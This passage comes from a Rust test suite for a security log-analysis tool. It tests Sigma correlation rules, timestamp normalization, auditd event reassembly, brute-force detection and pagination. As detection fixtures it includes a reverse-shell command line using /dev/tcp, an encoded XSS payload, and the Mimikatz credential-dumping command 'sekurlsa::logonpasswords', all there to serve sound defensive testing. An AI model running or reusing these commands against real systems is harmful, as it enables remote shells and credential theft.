        let rules = detections::test_ruleset(vec![], crate::sigma::convert_text(yaml).unwrap()).unwrap();
        detections::run(
            &detections::Inputs { rules: &rules, catalog: None, settings: &Settings::default() },
            &Source::Events(events.iter().collect()),
        )
        .unwrap()
    };
    let mut a = process(0, 0, "whoami");
    a.fields.insert("stage".into(), json!("created"));
    a.fields.insert("created_id".into(), json!("object-1"));
    let mut b = process(1, 1, "whoami");
    b.fields.insert("stage".into(), json!("used"));
    b.fields.insert("used_id".into(), json!("object-1"));
    assert!(contains(&evaluate(base, &[a.clone(), b.clone()]), "sigma:chain"));
    b.timestamp = Some(a.timestamp.unwrap() - 1);
    assert!(!contains(&evaluate(base, &[a.clone(), b.clone()]), "sigma:chain"));
    assert!(contains(&evaluate(&base.replace("temporal_ordered", "temporal"), &[a.clone(), b.clone()]), "sigma:chain"));
    b.fields.insert("used_id".into(), json!("another"));
    assert!(!contains(&evaluate(&base.replace("temporal_ordered", "temporal"), &[a.clone(), b]), "sigma:chain"));
    let count = base[..base.find("---\ntitle: Used").unwrap()].to_string()
        + r#"
---
title: Count
id: count
x-loginsight-evidence: {level: 1, rationale: "Specific test count", maturity: experimental}
correlation:
  type: value_count
  rules: [created]
  group-by: [host.name]
  timespan: 5m
  condition: {gte: 2, field: created_id}
"#;
    let mut c = a.clone();
    c.id = 2;
    assert!(!contains(&evaluate(&count, &[a.clone(), c.clone()]), "sigma:count"));
    c.fields.insert("created_id".into(), json!("object-2"));
    assert!(contains(&evaluate(&count, &[a.clone(), c.clone()]), "sigma:count"));
    a.fields.insert("bytes".into(), json!(40));
    c.fields.insert("bytes".into(), json!(60));
    let sum = count.replace("value_count", "value_sum").replace("gte: 2, field: created_id", "gte: 100, field: bytes");
    assert!(contains(&evaluate(&sum, &[a.clone(), c.clone()]), "sigma:count"));
    assert!(!contains(&evaluate(&sum, &[a.clone()]), "sigma:count"));
    let avg = sum.replace("value_sum", "value_avg").replace("gte: 100", "gte: 50");
    assert!(contains(&evaluate(&avg, &[a.clone(), c.clone()]), "sigma:count"));
    assert!(crate::sigma::convert_text(&sum.replace("gte: 100", "gt: 100")).is_err());
    assert!(crate::sigma::convert_text(&base.replace("temporal_ordered", "unknown_type")).is_err());
    assert!(crate::sigma::convert_text(&base.replace("[created, used]", "[chain, used]")).is_err());
    assert!(crate::sigma::convert_text(&base.replace("stage: created", "stage|unknown_modifier: created")).is_err());
    assert_eq!(crate::sigma::convert_text(base).unwrap()[0].def.evidence.assessed_level(), 0);
}

#[test]
fn security_custom_time_requires_units_or_explicit_timezone() {
    let e = event(0, 0, json!({"custom_time":"2026-09-26 10:00:00"}));
    let mut m: crate::security_normalize::SourceMapping =
        serde_json::from_value(json!({"source":"contract-test","fields":{"timestamp":"custom_time"}})).unwrap();
    let (view, n) = crate::security_normalize::normalize(&e, &[m.clone()]);
    assert!(view.timestamp.is_none());
    assert!(n.time.ambiguity.is_some());
    m.timezone = Some("-03:00".into());
    let (view, n) = crate::security_normalize::normalize(&e, &[m]);
    assert_eq!(view.timestamp, crate::sources::parse_timestamp("2026-09-26T13:00:00Z"));
    assert_eq!(n.time.field, "custom_time");
}

#[test]
fn security_audit_fragments_and_decoding_keep_original_provenance() {
    let mut syscall = event(0, 0, json!({"audit_serial":"42","type":"SYSCALL","Computer":"host","success":"yes"}));
    syscall.source = "auditd".into();
    let mut exec = syscall.clone();
    exec.id = 1;
    exec.fields.remove("success");
    exec.fields.insert("type".into(), json!("EXECVE"));
    exec.fields
        .extend(json!({"argc":3,"a0":"bash","a1":"-i","a2":"/dev/tcp/192.0.2.1/4"}).as_object().unwrap().clone());
    assert_eq!(crate::security_reconstruct::key(&syscall), crate::security_reconstruct::key(&exec));
    let operation = crate::security_reconstruct::assemble(vec![exec, syscall]).unwrap();
    assert_eq!(crate::entities::action_outcome(&operation.event), (Some("process_start"), Some("success")));
    assert_eq!(operation.members.len(), 2);
    assert!(operation.event.fields["cmdline"].as_str().unwrap().contains("/dev/tcp/"));
    let ev = event(0, 0, json!({"http.request.body":"%3Cscript%3Ealert(1)%3C/script%3E"}));
    let hits = crate::threats::builtin_catalog().explain(&ev);
    assert!(hits
        .iter()
        .any(|h| h.normalized && h.provenance.field == "http.request.body" && h.provenance.direction == "request"));
}

#[test]
fn security_nat_and_homonymous_accounts_do_not_supply_success() {
    let mut events:Vec<_>=(0..5).map(|i|event(i,i as i64,json!({"event.category":"authentication","event.action":"logon","event.outcome":"failure","host.name":"server","service.name":"ssh","user.name":"ana","user.domain":"a","source.ip":"192.0.2.1"}))).collect();
    let mut success = events[0].clone();
    success.id = 5;
    success.timestamp = events[4].timestamp.map(|t| t + 1000);
    success.fields.insert("event.outcome".into(), json!("success"));
    events.push(success);
    assert!(contains(&run(&events), "auth.bruteforce.success"));
    for field in ["user.name", "user.domain", "service.name", "host.name"] {
        let mut negative = events.clone();
        negative[5].fields.insert(field.into(), json!("different"));
        assert!(!contains(&run(&negative), "auth.bruteforce.success"), "{field}");
    }
}

#[test]
fn security_pagination_preserves_complete_episodes_and_classification() {
    let mut events = chains().remove(0).1;
    events.push(process(42, 20, "sekurlsa::logonpasswords"));
    let full = crate::triage::project(&serde_json::to_value(run(&events)).unwrap(), 1, None);
    let page = crate::triage::paginate(full.clone(), 0, 1).unwrap();
    assert_eq!(page["counts_by_level"], full["counts_by_level"]);
    assert_eq!(page["analysis_id"], full["analysis_id"]);
    assert_eq!(page["episodes"].as_array().unwrap().len(), 1);
    assert_eq!(page["episodes"][0]["event_refs"], full["episodes"][0]["event_refs"]);
    for d in page["detections"].as_array().unwrap() {
        let original = full["detections"].as_array().unwrap().iter().find(|a| a["id"] == d["id"]).unwrap();
        assert_eq!(original, d);
    }
    let defaults: crate::mcp::TriageParams = serde_json::from_str("{}").unwrap();
    assert_eq!(defaults.minimum_evidence.unwrap_or(5), 5);
    assert!(crate::triage::paginate(full, 0, 0).is_err());
}
